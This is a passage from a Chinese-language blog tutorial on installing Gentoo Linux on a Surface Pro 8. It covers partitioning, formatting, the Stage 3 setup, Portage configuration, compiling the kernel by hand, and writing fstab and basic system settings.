官网上下载镜像后</a> 用 balenaEtcher 或是一些其他的软件或是直接 <code>dd</code> 往 U 盘里写都 ok，其中 <code>Minimal Installation CD</code> 和 Arch 一样只有命令行，而 <code>LiveGUI USB Image</code> 则带有一个图形环境，<strong>但是最后都是要敲命令行一步步安装</strong> ，只是带 GUI 的会有个 KDE 桌面让你能在 Konsole 中敲，方便开浏览器和联网 ：）</p><blockquote><p>以及别忘了在 Surface UEFI 中将 USB 调整为第一启动项</p></blockquote><p>进入桌面后只有一个 <a href="https://wiki.gentoo.org/wiki/Handbook:Main_Page">Gentoo Linux Handbook</a> 的快捷方式，而不似其他 Linux 发行版有引导式安装程序：</p><p><img src="https://s2.loli.net/2024/04/30/xaksIHeSrmup2VT.jpg" alt="需要注意的是 Surface 屏幕分辨率较高，建议调一下缩放后 logout 再重新进来"></p><h2 id="创建文件系统"><a href="#创建文件系统" class="headerlink" title="创建文件系统"></a>创建文件系统</h2><blockquote><p>网络连接笔者直接使用 KDE 组件完成了，习惯命令行的也可以尝试使用 <code>net-setup</code> </p></blockquote><p>首先我们先使用 <code>cfdisk</code> 对硬盘进行分区，按惯例建立四个新分区：</p><ul><li>EFI 分区（<code>fat32</code>，挂载在 <code>/boot/efi</code> ）：存放 EFI 启动程序（grub）</li><li>系统分区（ <code>ext4</code> ，挂载在 <code>/</code> ）：存放系统基本文件</li><li>数据分区（ <code>ext4</code> ，挂载在 <code>/home</code> ）：存放用户数据</li><li>SWAP 分区（<code>swap</code> ）：交换内存</li></ul><p>Surface 上仅有一块 SSD ，所以硬盘路径基本上定死为 <code>/dev/nvme0n1</code> ，如果你在其他有多块硬盘的机器上参照本文进行配置则注意识别自己想要安装的键盘</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">cfdisk /dev/nvme0n1</span><br></code></pre></td></tr></table></figure><blockquote><p>注：这一步使用 LiveGUI CD 中的 KDE Partitioner 或是 GParted 也可以</p></blockquote><p><img src="https://s2.loli.net/2024/04/30/y6X4YeOlGKPbNkC.jpg" alt="100M 是 Windows 分区弄错了留下来的一个多余的无用空间，因为 NTFS 没法前扩所以笔者也懒得管了"></p><p>接下来创建文件系统，惯例地 <code>mkfs</code> 一把梭，开始之前最好先 <code>fdisk -l</code> 再辨别一下自己想要格式化的分区：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">mkfs.fat -F 32 /dev/nvme0n1p4</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mkfs.ext4 /dev/nvme0n1p5</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mkswap /dev/nvme0n1p6</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">swapon /dev/nvme0n1p6</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mkfs.ext4 /dev/nvme0n1p7</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/04/30/FCveHV8alMDSgPW.jpg" alt="日志输出太长了，没法拍完屏，将就看看"></p><p>最后就是挂载文件系统了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> /mnt/gentoo</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount /dev/nvme0n1p5 /mnt/gentoo</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> /mnt/gentoo/boot</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> /mnt/gentoo/boot/efi</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> /mnt/gentoo/home</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount /dev/nvme0n1p4 /mnt/gentoo/boot/efi</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount /dev/nvme0n1p7 /mnt/gentoo/home</span><br></code></pre></td></tr></table></figure><h2 id="安装-Stage-3"><a href="#安装-Stage-3" class="headerlink" title="安装 Stage 3"></a>安装 Stage 3</h2><p><code>Stage</code> 可以简单理解为构建 Gentoo Linux 系统的各个不同阶段：</p><ul><li><code>Stage 1</code> ：通常仅 Gentoo 内部开发人员使用，由一个基本的 <code>packages,build</code> 文件生成的系统包</li><li><code>Stage 2</code> ：通常仅 Gentoo 内部开发人员使用，从 Stage 1 编译而来的可以自举的工具链</li><li><code>Stage 3</code> ：由 Stage 2 编译而来的文件，并包含一组  <a href="https://wiki.gentoo.org/wiki/System_set_(Portage)">@system set</a> 软件包</li><li><code>Stage 4</code> ：在 Stage 3 基础上安装好的完整的 Gentoo 系统</li></ul><p>首先我们将 <a href="https://www.gentoo.org/downloads/">Stage 3</a> 下载到文件系统根目录下解压，笔者比较习惯 systemd 所以还是选择 systemd + desktop 版的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cd</span> /mnt/gentoo</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">wget https://distfiles.gentoo.org/releases/amd64/autobuilds/20240428T163427Z/stage3-amd64-desktop-systemd-20240428T163427Z.tar.xz</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">tar xpvf stage3-*.tar.xz --xattrs-include=<span class="hljs-string">&#x27;*.*&#x27;</span> --numeric-owner</span><br></code></pre></td></tr></table></figure><p>然后是配置机器时间：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">chronyd -q</span><br></code></pre></td></tr></table></figure><p>接下来配置编译选项，Portage 在运行时会读取一个 <code>make.conf</code> 配置文件，位于文件系统根目录下的 <code>/etc/portage/make.conf</code> 当中，Stage 3 文件中已经给我们提供好了一个空白模板，其中主要是一些编译参数与选项，我们只需要根据自身习惯进行修改即可：</p><blockquote><p>一般来说只需要在 <code>COMMON_FLAGS</code> 中添加 <code>-march=native</code> 以告诉编译器选择当前的系统体系结构，此时 GCC 会自动调查 CPU 并配置合适的 flag，但若是当前机器正在为其他机器编译时则不应当启用该项</p><p>对于内存比较小的设备，则不应当启用 <code>-pipe</code> 编译选项，因为这使用管道而非文件来存放编译中间文件，而这将占用更多的内存，从而导致编译器可能被 kill 掉而编译失败</p><p>其他的可用选项可以参照 <a href="https://wiki.gentoo.org/wiki//etc/portage/make.conf">Gentoo wiki</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">vim ./etc/portage/make.conf</span><br></code></pre></td></tr></table></figure><h2 id="安装基本系统"><a href="#安装基本系统" class="headerlink" title="安装基本系统"></a>安装基本系统</h2><p>接下来复制 DNS 信息，从而确保 chroot 之后有网可用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cp</span> --dereference /etc/resolv.conf /mnt/gentoo/etc/</span><br></code></pre></td></tr></table></figure><p>接下来挂载一些必要的文件系统并 chroot 到根目录，也可以直接通过 <code>arch-chroot /mnt/gentoo</code> 命令完成：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --types proc /proc /mnt/gentoo/proc</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --rbind /sys /mnt/gentoo/sys</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --make-rslave /mnt/gentoo/sys</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --rbind /dev /mnt/gentoo/dev</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --make-rslave /mnt/gentoo/dev</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --<span class="hljs-built_in">bind</span> /run /mnt/gentoo/run</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --make-slave /mnt/gentoo/run</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">chroot</span> /mnt/gentoo /bin/bash</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">source</span> /etc/profile</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">export</span> PS1=<span class="hljs-string">&quot;(chroot) <span class="hljs-variable">$&#123;PS1&#125;</span>&quot;</span></span><br></code></pre></td></tr></table></figure><p>接下来配置 Portage 仓库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> --parents /etc/portage/repos.conf</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cp</span> /usr/share/portage/config/repos.conf /etc/portage/repos.conf/gentoo.conf</span><br></code></pre></td></tr></table></figure><p>接下来安装 Gentoo ebuild 数据库快照：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge-webrsync</span><br></code></pre></td></tr></table></figure><blockquote><p>（可选配置：选择镜像站）</p><p>若有需要，则可以使用 <code>mirrorselect</code> 这个工具来手动选择想要使用的镜像源（空格键选中后 enter，可以选多个项），本质上是往 <code>make.conf</code> 中写入新的 <code>GENTOO_MIRRORS</code> 变量：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask --verbose --oneshot app-portage/mirrorselect</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mirrorselect -i -o &gt;&gt; /etc/portage/make.conf</span><br></code></pre></td></tr></table></figure></blockquote><p>接下来配置系统的 <code>profile</code> （决定了系统的默认配置，例如 <code>USE</code> 和 <code>CFLAGS</code> 等），第一条命令用来查看可用配置，第二条则进行选择，这里笔者选择了 <code>default/linux/amd64/23.0/desktop/plasma/systemd</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect profile list</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect profile <span class="hljs-built_in">set</span> 28</span><br></code></pre></td></tr></table></figure><blockquote><p>（可选配置：添加二进制包源）</p><p>众所周知 gentoo 是个几乎任何东西都要自行编译的发行版，如果你不想在当前机器上进行编译，而想要像其他发行版那样直接拿二进制可执行文件，则可以配置一个 <code>binary package host</code> ，这可以是你的另一台 Gentoo 机器，也可以是官方或是其他人的源</p><p>源地址需要写在 <code>/etc/portage/binrepos.conf/gentoobinhost.conf</code> 文件中，这是官方给的一个例子：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[binhost]</span><br><span class="hljs-attr">priority</span> = <span class="hljs-number">9999</span><br><span class="hljs-attr">sync-uri</span> = https://distfiles.gentoo.org/releases/&lt;arch&gt;/binpackages/&lt;profile&gt;/x86-<span class="hljs-number">64</span>/<br></code></pre></td></tr></table></figure><p>对于想要以获取二进制可执行文件的形式进行安装的软件包，在使用 <code>emerge</code> 安装软件时添加 <code>--getbinpkg</code> 即可，也可以通过修改 <code>/etc/portage/make.conf</code> 文件并添加 <code>FEATURES</code> 变量来完成，例如：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># Appending getbinpkg to the list of values within the FEATURES variable</span><br><span class="hljs-attr">FEATURES</span>=<span class="hljs-string">&quot;$&#123;FEATURES&#125; getbinpkg&quot;</span><br><span class="hljs-comment"># Require signatures</span><br><span class="hljs-attr">FEATURES</span>=<span class="hljs-string">&quot;$&#123;FEATURES&#125; binpkg-request-signature&quot;</span><br></code></pre></td></tr></table></figure><p>若选择这种方式，则在修改后需要额外运行 <code>getuto</code> 命令进行配置</p></blockquote><p>接下来配置 <code>CPU_FLAGS_*</code> 变量，编译器会在编译特定汇编代码&#x2F;指令时使用，笔者是 <code>x86/64</code> 架构所以应当为 <code>CPU_FLAGS_X86</code> ，不过工具 <code>cpuid2cpuflags</code> 可以帮我们完成输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask --oneshot app-portage/cpuid2cpuflags</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*/* <span class="hljs-subst">$(cpuid2cpuflags)</span>&quot;</span> &gt; /etc/portage/package.use/00cpu-flags</span><br></code></pre></td></tr></table></figure><p>接下来在 <code>/etc/portage/make.conf</code> 中添加 <code>VIDEO_CARDS</code> 变量，用以恰当地配置 GPU，Surface Pro 8 只有一个 Intel 核显所以该变量应为：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">VIDEO_CARDS</span>=<span class="hljs-string">&quot;intel&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>（可选配置：可接受的 License）</p><p>如果你对软件包有 License 洁癖，不是 GPL&#x2F;MIT&#x2F;.. 的不用，则可以配置 <code>ACCEPT_LICENSE</code> 变量，建议参照官方的 handbook</p><p>如果想全都接收，则在 <code>/etc/portage/make.conf</code> 中将该变量设为：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">ACCEPT_LICENSE</span>=<span class="hljs-string">&quot;*&quot;</span><br></code></pre></td></tr></table></figure></blockquote><p>接下来配置时区，笔者用的是 systemd ，所以直接将时区文件软链接到 <code>/etc/localtime</code> 即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">ln</span> -sf ../usr/share/zoneinfo/Australia/Melbourne /etc/localtime</span><br></code></pre></td></tr></table></figure><p>然后是进行本地化配置，在 <code>/etc/locale.gen</code> 中添加对应项即可，例如：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">en_US</span> ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span><br><span class="hljs-attribute">en_US</span>.UTF-<span class="hljs-number">8</span> UTF-<span class="hljs-number">8</span><br><span class="hljs-attribute">zh_CN</span> GBK <br><span class="hljs-attribute">zh_CN</span>.UTF-<span class="hljs-number">8</span> UTF-<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>接下来运行 <code>locale-gen</code> 命令，其会根据  <code>/etc/locale.gen</code> 中项进行生成，生成结束后通过 <code>eselect</code> 命令进行选择，这里最好先选择 <code>C.utf8</code> ，完成之后更新环境变量：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">locale-gen</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect locale list</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect locale <span class="hljs-built_in">set</span> 2</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">env-update &amp;&amp; <span class="hljs-built_in">source</span> /etc/profile &amp;&amp; <span class="hljs-built_in">export</span> PS1=<span class="hljs-string">&quot;(chroot) <span class="hljs-variable">$&#123;PS1&#125;</span>&quot;</span></span><br></code></pre></td></tr></table></figure><p>对于中文用户，你可能会需要 gentoo 中文社区的仓库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask app-eselect/eselect-repository</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect repository <span class="hljs-built_in">enable</span> gentoo-zh</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emaint <span class="hljs-built_in">sync</span> -r gentoo-zh</span><br></code></pre></td></tr></table></figure><h2 id="编译与安装内核"><a href="#编译与安装内核" class="headerlink" title="编译与安装内核"></a>编译与安装内核</h2><blockquote><p>（可选配置：安装固件与微码）</p><p>在开始配置内核前我们可以安装可选的微码与固件，Surface Pro 8 是 Intel CPU，所以微码应当安装 <code>sys-firmware/intel-microcode</code> 包，固件则都为通用的 <code>sys-kernel/linux-firmware</code> 包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-firmware/intel-microcode</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-kernel/linux-firmware</span><br></code></pre></td></tr></table></figure><p>可能会遇到 <code>all ebuilds that could satisfy * have been masked</code> 的错误，这是因为 LICENSE 配置问题，通过如下命令进行补充即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;sys-kernel/linux-firmware @BINARY-REDISTRIBUTABLE&quot;</span> | <span class="hljs-built_in">tee</span> -a /etc/portage/package.license</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;sys-firmware/intel-microcode @BINARY-REDISTRIBUTABLE&quot;</span> | <span class="hljs-built_in">tee</span> -a /etc/portage/package.license</span><br></code></pre></td></tr></table></figure></blockquote><p>虽然内核主线暂且缺少一些 Surface 驱动，但是有一个社区项目 <a href="https://github.com/linux-surface/linux-surface">linux-surface</a> 提供了部分驱动，可惜的是该项目本身仅提供 Arch&#x2F;Debian&#x2F;Fedora 的版本，而在 Wiki 中 fork 到 Gentoo 这边<a href="https://github.com/Parinz/Surface-Gentoo">对应仓库</a>的维护者不知道什么时候已经跑路了，因此笔者只能先用默认的内核，这里我们有三种大方向上的选择：</p><ul><li>安装 <a href="https://wiki.gentoo.org/wiki/Project:Distribution_Kernel">Distribution kernels</a>：Gentoo 官方维护的 kernel，涵盖了内核编译安装的完整过程且已经配置好了一份支持主要硬件的配置文件，<a href="https://wiki.gentoo.org/wiki/Project:Distribution_Kernel#Modifying_kernel_configuration">配置文件也可以手工更改</a>，安装方法与装普通软件包无异</li><li>使用 <a href="https://wiki.gentoo.org/wiki/Genkernel">Genkernel</a> 进行配置：<code>genkernel</code> 是 Gentoo 官方提供的用来自动构建内核与 initramfs 的软件，简化了使用者手工安装内核的过程</li><li>纯手工编译安装内核：通过 <code>eselect kernel</code> 拉取内核源码后手工 <code>make</code> 进行配置、编译、安装，_<a href="https://github.com/arttnba3/XDU-SCE_OS-Experiment_2021/tree/main/Exp-7">就像你的操作系统老师让你在操作系统实验课上做的那样</a>_ ， <del>没让你自己从 kernel.org 拉就偷着乐吧</del></li></ul><p>作为 Linux kernel hacker，手工编译内核自然是第一选择，主要原因是方便更改编译选项 <del>而且这样看起来会显得👴比较帅</del> </p><blockquote><p>不选 distribution 的原因是配置文件中可能未必默认包含笔者需要的硬件驱动，再逐条改起来有点麻烦，而 Genkernel 感觉有点上不去下不来卡在那里了</p></blockquote><p>首先安装必要的工具：</p><blockquote><p>其中 <a href="https://wiki.gentoo.org/wiki/Installkernel">installkernel</a> 是可选包，用于自动安装新的内核并更新 bootloader 配置， <del>如果你比较闲的话也可以手工完成</del></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-apps/pciutils</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-kernel/installkernel</span><br></code></pre></td></tr></table></figure><p>拉取 Gentoo 官方维护的内核源码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-kernel/gentoo-sources</span><br></code></pre></td></tr></table></figure><blockquote><p>如果你选择用 gentoo 官方的内核配置（<code>gentoo-kernel</code>），可能出现提示需要检查 configure 的问题，使用如下命令修复：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">dispatch-conf</span><br></code></pre></td></tr></table></figure><p>基本上一路 <code>u</code> （update） 即可</p></blockquote><p>使用如下命令查看当前安装的源码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect kernel list</span><br></code></pre></td></tr></table></figure><p>通常我们会在 Linux 系统中维护一个指向当前内核源码的符号链接 <code>/usr/src/linux</code>，在 Gentoo 下我们通过如下命令手动创建（序号由 <code>eselect</code> 命令获得）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect kernel <span class="hljs-built_in">set</span> 1</span><br></code></pre></td></tr></table></figure><p>接下来创建配置文件 <code>.config</code> ，这里笔者使用 <code>make localmodconfig</code> 来检测硬件并决定开启的内核模块，你也可以用默认的 <code>make defconfig</code> ，根据自己的需求进行选择即可：</p><blockquote><p>内核模块会独立存在，如果你想让内核模块被编译到 vmlinuz 中，使用 <code>localyesconfig</code> </p><blockquote><p> 但是集成到内核中的内核模块可能会有点小问题（例如笔者曾经碰到过网卡驱动独立存在可以正常存活但集成到内核中便无法正常工作的情况）</p></blockquote></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cd</span> /usr/src/linux</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">make localmodconfig</span><br></code></pre></td></tr></table></figure><p>接下来用 menuconfig 手动改一些选项，其会在已有的 <code>.config</code> 基础上进行修改，这里我们要决定的包括 OpenRC&#x2F;systemd 的选择、常用文件系统支持、额外选一些 Surface 相关的驱动等，具体参见 <a href="https://wiki.gentoo.org/wiki/Handbook:AMD64/Installation/Kernel#Alternative:_Manual_configuration">Gentoo handbook</a>：</p><blockquote><p>在这一步，你可能会需要手动开启 iwlwifi 的编译支持，参见 <a href="https://wiki.gentoo.org/wiki/Iwlwifi">Gentoo wiki - iwlwifi</a> 的 <code>Device driver wilwifi</code>  一节</p><p>在这一步，你还可能会需要手动将网卡固件添加到配置中，参见 <a href="https://wiki.gentoo.org/wiki/Iwlwifi">Gentoo wiki - iwlwifi</a> 的 <code>Firmware</code>  一节<a href="https://wiki.gentoo.org/wiki/Iwlwifi">https://wiki.gentoo.org/wiki/Iwlwifi</a>)</p><blockquote><p>如果不清楚应该添加哪个固件，可以 <code>dmesg | grep -i wifi | grep -i ucode</code> 查看在 LiveISO 当中使用的是哪个</p></blockquote></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">make menuconfig</span><br></code></pre></td></tr></table></figure><p>然后开始编译内核，这可能会需要一定的时间：</p><blockquote><p>实际上在笔者的机器上 8 分钟左右就能完成了，笔者也没想到 <code>1135g7</code> 的性能这么强，可能这就是科技的进步吧 ：）</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">make -j$(<span class="hljs-built_in">nproc</span>) &amp;&amp; make modules_install -j$(<span class="hljs-built_in">nproc</span>)</span><br></code></pre></td></tr></table></figure><p>接下来使用 <a href="https://wiki.gentoo.org/wiki/Installkernel">installkernel</a> 安装内核，这里笔者选择使用 <code>GRUB + systemd</code> ，首先创建文件 <code>/etc/portage/package.use/installkernel</code> 并写入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sys-kernel/installkernel grub dracut<br></code></pre></td></tr></table></figure><p>然后运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-kernel/installkernel</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">make install</span><br></code></pre></td></tr></table></figure><h2 id="配置系统"><a href="#配置系统" class="headerlink" title="配置系统"></a>配置系统</h2><p>首先配置 <code>/etc/fstab</code> ，这个文件决定了在系统启动时哪些分区该被挂载到哪些目录，为了保证挂载的一致性，通常我们会选择使用一个分区的 UUID 进行挂载，而非设备路径，因为在有着多个磁盘的环境中不同磁盘的路径在启动后未必一致</p><blockquote><p>不过因为笔者的 Surface Pro 8 仅有一个盘位，所以是可以使用设备路径进行挂载的，但保险起见还是用 UUID 进行挂载</p></blockquote><p>首先查看不同分区的 UUID：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">blkid</span><br></code></pre></td></tr></table></figure><p>接下来按照分区用途编写 fstab，以笔者的配置为例：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">UUID</span>=f0e95c49-e05d-<span class="hljs-number">4659</span>-a617-bfdaee35af7c none       swap  sw           <span class="hljs-number">0</span> <span class="hljs-number">0</span><br><span class="hljs-attribute">UUID</span>=<span class="hljs-number">8317</span>cece-<span class="hljs-number">8</span>c46-<span class="hljs-number">4</span>fec-bdf6-ddab4aa23249 /          ext4  defaults     <span class="hljs-number">0</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">UUID</span>=<span class="hljs-number">5</span>e8624e3-b40e-<span class="hljs-number">4</span>e6c-be02-e72a99e94462 /home      ext4  data=ordered <span class="hljs-number">0</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">UUID</span>=C215-<span class="hljs-number">9</span>C27                            /boot/efi  vfat  utf8         <span class="hljs-number">0</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>然后配置主机名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Surface-Pro-8&quot;</span> &gt; /etc/hostname</span><br></code></pre></td></tr></table></figure><p>配置 DHCP：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask net-misc/dhcpcd</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> dhcpcd</span><br></code></pre></td></tr></table></figure><p>设置 root 密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">passwd</span><br></code></pre></td></tr></table></figure><p>初始化一些配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">systemd-machine-id-setup</span><br><span class="hljs-meta prompt_"># 